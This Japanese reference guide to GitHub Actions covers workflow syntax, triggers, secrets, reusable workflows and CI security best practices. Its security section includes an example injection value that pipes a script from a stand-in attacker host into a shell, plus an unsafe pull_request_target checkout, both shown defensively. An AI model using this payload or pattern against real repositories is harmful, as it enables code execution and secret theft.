---
reviewed: 2026-05-05
tags: [github, yaml]
---

# GitHub Actions

GitHub ネイティブの CI/CD プラットフォーム。ワークフローを YAML で定義し、リポジトリへのイベント（push, PR, schedule 等）に応じて実行する。`gh` CLI と並んで GitHub 運用の中核。

公式: [docs.github.com/actions](https://docs.github.com/en/actions)

## ワークフローの最小形

`.github/workflows/ci.yaml`:

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - uses: pnpm/action-setup@v6
        with:
          version: 10
      - uses: actions/setup-node@v6
        with:
          node-version: 24
          cache: pnpm
      - run: pnpm install --frozen-lockfile
      - run: pnpm run test
```

ファイルは必ず `.github/workflows/` 配下。ブランチごとの workflow も可能だが、`main` にある状態がデフォルトの定義として使われる。

## トリガー（`on`）

| イベント | 説明 |
|---|---|
| `push` | ブランチ・タグへの push |
| `pull_request` | PR の open / sync / labeled 等 |
| `schedule` | cron 形式（UTC） |
| `workflow_dispatch` | 手動実行（UI や API から） |
| `workflow_call` | 他 workflow から呼び出し（再利用） |
| `repository_dispatch` | 外部 API からの呼び出し |
| `release` | リリース作成時 |
| `issues` / `issue_comment` / `pull_request_review` | 会話系イベント |

```yaml
on:
  push:
    branches: [main]
    paths: ["src/**", "package.json"]    # 特定パス変更時のみ
  schedule:
    - cron: "0 6 * * 1"                  # 毎週月曜 06:00 UTC
  workflow_dispatch:
    inputs:
      environment:
        description: "Target env"
        required: true
        default: "staging"
```

## Job と Step

```yaml
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - run: pnpm biome ci

  test:
    runs-on: ubuntu-latest
    needs: lint                       # lint 成功後に実行
    strategy:
      matrix:
        node: [20, 22, 24]
    steps:
      - uses: actions/checkout@v6
      - uses: actions/setup-node@v6
        with:
          node-version: ${{ matrix.node }}
      - run: pnpm install --frozen-lockfile
      - run: pnpm run test
```

| 概念 | 説明 |
|---|---|
| `jobs.<id>.runs-on` | ランナー種別（`ubuntu-latest` / `macos-latest` / `windows-latest` / self-hosted） |
| `needs` | 依存（完了後に実行） |
| `strategy.matrix` | 組み合わせ並列実行 |
| `steps` | `uses`（action 呼び出し） or `run`（シェル実行） |
| `if` | 条件実行（`${{ github.event_name == 'push' }}` 等） |

## 主要な公式 / 準公式 Action

| Action | 用途 |
|---|---|
| `actions/checkout@v6` | リポジトリ取得（必須） |
| `actions/setup-node@v6` | Node セットアップ + キャッシュ |
| `pnpm/action-setup@v6` | pnpm インストール |
| `actions/setup-python@v6` | Python |
| `actions/setup-go@v6` | Go |
| `actions/cache@v5` | 汎用キャッシュ |
| `actions/upload-artifact@v7` / `download-artifact@v8` | Job 間のファイル受け渡し |
| `actions/github-script@v9` | GitHub API を Node で叩く |
| `softprops/action-gh-release@v2` | リリース作成 |
| `jdx/mise-action@v4` | mise 経由でツールインストール |

バージョンは**メジャー固定 + パッチ追従**（`@v4`）が一般的。完全固定（SHA）が最もセキュアだが更新負荷が高い。

## シークレットと変数

### Secrets

```yaml
steps:
  - run: ./deploy.sh
    env:
      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
```

`Settings > Secrets and variables > Actions` で登録。**ログに出ると自動マスクされる**が、意図的な出力でも一部漏れ得るので `echo "$TOKEN"` は避ける。

### Variables

非機密の設定値は Variables に（`${{ vars.ENV_NAME }}`）。

### Environment

```yaml
jobs:
  deploy:
    environment: production
    steps: [...]
```

Environment ごとに secrets/vars を分離 + approve ゲートを設置できる（production デプロイで必須）。

## GITHUB_TOKEN

各 job で自動発行される一時トークン。リポジトリへの limited な権限を持つ。デフォルトは read-only（組織設定による）。

```yaml
permissions:
  contents: write     # コミット・タグ作成
  pull-requests: write
  issues: write
```

**最小権限原則**: 必要なスコープだけ明示的に付与する。

## 並列実行とキャッシュ

### キャッシュ

```yaml
- uses: actions/setup-node@v6
  with:
    cache: pnpm                       # 組み込みキャッシュ

# 汎用キャッシュ
- uses: actions/cache@v5
  with:
    path: ~/.cache/pnpm
    key: ${{ runner.os }}-pnpm-${{ hashFiles('pnpm-lock.yaml') }}
    restore-keys: |
      ${{ runner.os }}-pnpm-
```

`setup-node` の `cache: pnpm` を使えば多くの場合 `actions/cache` は不要。

### Concurrency

同じ PR に複数 push した際、古い実行をキャンセル:

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```

## 再利用可能 workflow（Reusable workflow）

`workflow_call` をトリガーに持つ workflow を別 workflow から呼び出す。**job 単位の再利用**で、独立した job として実行される（呼び出し側の Job Summary に別 job として並ぶ）。

```yaml
# .github/workflows/reusable-test.yaml
on:
  workflow_call:
    inputs:
      node-version:
        type: string
        default: "24"
    outputs:
      coverage:
        description: "Coverage %"
        value: ${{ jobs.test.outputs.coverage }}
    secrets:
      CODECOV_TOKEN:
        required: false

jobs:
  test:
    runs-on: ubuntu-latest
    outputs:
      coverage: ${{ steps.cov.outputs.percent }}
    steps:
      - uses: actions/checkout@v6
      - uses: actions/setup-node@v6
        with:
          node-version: ${{ inputs.node-version }}
      - run: pnpm run test
      - id: cov
        run: echo "percent=92" >> "$GITHUB_OUTPUT"
```

呼び出し側:

```yaml
jobs:
  test-20:
    uses: ./.github/workflows/reusable-test.yaml
    with:
      node-version: "20"
    secrets: inherit            # 呼び出し元の全 secrets を引き継ぐ
  test-24:
    uses: ./.github/workflows/reusable-test.yaml
    with:
      node-version: "24"
    secrets:
      CODECOV_TOKEN: ${{ secrets.CODECOV_TOKEN }}    # 個別指定
```

組織共通の workflow は `org/.github` リポジトリに置いて `uses: org/.github/.github/workflows/foo.yaml@v1` で参照できる。**他リポジトリ参照時はタグ / SHA を必ず付ける**（`@main` だと再現性が損なわれる）。

## Composite Action

複数ステップを 1 つの action にまとめて再利用する。**ステップ単位の再利用**で、呼び出し側 job の中に inline 展開される（独立した job ではない）。

```yaml
# .github/actions/setup/action.yaml
name: setup
description: Install pnpm + Node + dependencies
inputs:
  node-version:
    required: false
    default: "24"
outputs:
  cache-hit:
    value: ${{ steps.node.outputs.cache-hit }}
runs:
  using: composite
  steps:
    - uses: pnpm/action-setup@v6
      with: { version: 10 }
    - id: node
      uses: actions/setup-node@v6
      with:
        node-version: ${{ inputs.node-version }}
        cache: pnpm
    - run: pnpm install --frozen-lockfile
      shell: bash
```

呼び出し:

```yaml
- uses: ./.github/actions/setup
  with:
    node-version: "20"
```

注意点:

- composite の `run:` は `shell:` 必須（reusable workflow は不要）
- `secrets:` を直接受け取れない。呼び出し側で `env:` 経由で渡すか、`inputs:` に明示する
- 同一リポジトリ参照は `./` 始まり、外部リポジトリ参照は `org/repo/path@ref`

### 使い分け

| 観点 | Reusable workflow | Composite action |
|---|---|---|
| 単位 | job | step |
| 独立 job として表示 | される | されない |
| matrix 展開 | 呼び出し側で可能 | 不可（呼び出し job の matrix に従う） |
| `secrets:` 受け取り | できる（`secrets: inherit` 可） | できない（input/env で明示） |
| `runs-on` 指定 | できる | 呼び出し側に従う |
| 用途 | テスト・ビルド・デプロイ等の **job 全体**の再利用 | セットアップ手順等の **step 列**の再利用 |

## gh CLI との連携

```yaml
- run: gh pr comment ${{ github.event.pull_request.number }} --body "CI completed"
  env:
    GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

gh は `GH_TOKEN` で認証可能。ローカル開発と同じコマンドが CI でも動く。

## セキュリティベストプラクティス

GitHub Actions のセキュリティは「**実行コードの信頼境界**」と「**シークレットの取り扱い**」の 2 軸で考える。

### 1. `permissions:` を最小化する

組織設定で `GITHUB_TOKEN` のデフォルト権限を `read` に絞り、必要な job のみ昇格する:

```yaml
# workflow 全体のデフォルトを read-only に
permissions:
  contents: read

jobs:
  release:
    permissions:
      contents: write     # この job だけタグ作成を許可
      id-token: write     # OIDC を使う場合
    steps: [...]
```

job レベルの `permissions:` は workflow レベルの宣言を**完全に置き換える**（マージではない）。job レベルで `contents: write` を書いたら、他のスコープは未付与扱いになる。

### 2. サードパーティ action は SHA で pin する

タグ（`@v4`）は書き換え可能。リポジトリが乗っ取られると過去の `v4` タグが悪意ある commit に張り替えられ、CI 経由で secrets が抜かれる。

```yaml
# NG: タグ参照
- uses: some/action@v4

# OK: 完全 SHA + 確認済みバージョンをコメント
- uses: some/action@e83ad4c089b3186b7a5da8c9d9f8c6c43ceaef5e # v4.2.0
```

公式 (`actions/*`, `github/*`) はタグ運用でも実害は少ない。Renovate / Dependabot に SHA 更新を任せれば追随コストは下がる。

### 3. Untrusted input によるスクリプトインジェクション

`${{ github.event.pull_request.title }}` や `${{ github.head_ref }}` のように外部ユーザーが操作できる context を **shell スクリプトに直接展開しない**。フォーク PR のタイトルに `"; curl evil.example.com/x.sh | sh; #` を入れると、`run:` 内で実行される。

```yaml
# NG: シェルに直接展開
- run: echo "Title: ${{ github.event.pull_request.title }}"

# OK: env 経由で文字列として注入
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $TITLE"
```

危険な context 例: `pull_request.title` / `pull_request.body` / `issue.title` / `issue.body` / `comment.body` / `head_ref` / `head.ref`。

### 4. `pull_request_target` の取り扱い

`pull_request_target` は **PR のフォーク先コードが、ベースリポジトリの secrets と write 権限で動く**特殊イベント。便利だが、フォーク PR を `actions/checkout` の `ref` で指定して checkout したら任意コード実行になる。

```yaml
# 危険: PR のコードを secrets 付きで実行してしまう
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v6
        with:
          ref: ${{ github.event.pull_request.head.sha }}    # ← 危険
      - run: pnpm test
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
```

原則:

- フォーク PR にコメント・ラベル付けを行う等の **read-only な用途**に限定する
- どうしても PR コードを実行したい場合は `pull_request` を使い、`Settings > Actions > Fork pull request workflows` の承認制を使う

### 5. Secrets の取り扱い

- **構造化シークレット禁止**: JSON / YAML 全体を 1 secret に格納すると、部分参照したフィールドが masking されない。フィールドごとに secret を分ける
- **派生 secret は `::add-mask::`**: secret から導出した値（JWT、署名トークン等）を後続ステップで使う場合、`echo "::add-mask::$DERIVED"` で明示的に masking する
- **CLI 引数で渡さない**: 同一ランナー上の他 job から `ps` で見えうる。env で渡す
- **fork PR で secrets は渡らない**: `pull_request` イベントではフォークからの PR に secrets が露出しないが、`pull_request_target` では露出する

### 6. OIDC でクラウド認証する

長期 secret（`AWS_SECRET_ACCESS_KEY` 等）を保存せず、OIDC で短命トークンを取得する:

```yaml
permissions:
  id-token: write       # OIDC token 発行に必須
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v5
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubDeployRole
          aws-region: ap-northeast-1
      - run: aws s3 sync ./dist s3://my-bucket/
```

クラウド側の trust policy で `sub` claim（`repo:org/repo:ref:refs/heads/main` 等）を厳格に絞る。`repo:org/*` のようなワイルドカードは避ける。npm の Trusted Publishers も同じ仕組み（[`standards/npm-trusted-publishers.md`](../../standards/npm-trusted-publishers.md)）。

### 7. その他

- **依存追随**: Renovate / Dependabot で action のバージョンを追随する（[`tools/renovate.md`](../../tools/renovate.md), [`platforms/github/dependabot.md`](dependabot.md)）
- **シークレットスキャン**: `gitleaks` / `trivy` を CI に組み込む（[`tools/gitleaks.md`](../../tools/gitleaks.md), [`tools/trivy.md`](../../tools/trivy.md)）
- **Self-hosted runner はリポジトリスコープのみ**: public リポジトリで self-hosted を有効にすると任意コード実行リスクがある

## よく使う context 変数

| 変数 | 意味 |
|---|---|
| `${{ github.event_name }}` | トリガー名 |
| `${{ github.ref }}` | `refs/heads/<branch>` or `refs/tags/<tag>` |
| `${{ github.ref_name }}` | ブランチ/タグ名のみ |
| `${{ github.sha }}` | コミット SHA |
| `${{ github.actor }}` | 実行者 |
| `${{ github.workspace }}` | チェックアウトディレクトリ |
| `${{ runner.os }}` | `Linux` / `macOS` / `Windows` |
| `${{ secrets.<NAME> }}` | secret 参照 |
| `${{ vars.<NAME> }}` | variable 参照 |
| `${{ steps.<id>.outputs.<name> }}` | 前ステップの出力 |

## ステップ間データ受け渡し

```yaml
steps:
  - id: meta
    run: echo "version=$(cat VERSION)" >> "$GITHUB_OUTPUT"

  - run: echo "Version is ${{ steps.meta.outputs.version }}"
```

`$GITHUB_OUTPUT` ファイルに `name=value` 形式で追記。

## トラブルシュート

### `Resource not accessible by integration`

`permissions:` が足りない。エラーメッセージが要求する scope を追加。

### ビルドが毎回遅い

キャッシュが効いていない。`setup-node` の `cache: pnpm` を確認。`actions/cache` の `key` がロックファイルの hash を含んでいるか。

### 外部 action が非推奨になった

Renovate で自動更新するか、`actions/*` シリーズの公式版に移行（例: `actions/setup-node@v6` は cache 機能も内蔵）。

### `pull_request` でチェックが走らない

マージ元が初心者の PR だとワークフローが「承認」されるまで走らない（org 設定次第）。`Settings > Actions > Fork pull request workflows` を確認。

### matrix で特定組み合わせだけ除外

```yaml
strategy:
  matrix:
    os: [ubuntu-latest, windows-latest]
    node: [20, 22, 24]
    exclude:
      - os: windows-latest
        node: 20
```

## 他 CI との比較

| 観点 | GitHub Actions | GitLab CI | CircleCI |
|---|---|---|---|
| 設定 | YAML（多ファイル可） | YAML（基本 1 ファイル） | YAML |
| GitHub 連携 | ネイティブ | GitHub app | GitHub app |
| 無料枠 | 2,000 分/月（public 無制限） | 400 分/月 | 6,000 クレジット/月 |
| self-hosted | あり | あり | あり |
| 再利用 | reusable / composite | include | orbs |
| OIDC | あり（AWS/GCP/Azure） | あり | あり |

GitHub に閉じた運用では Actions がデフォルト選択。
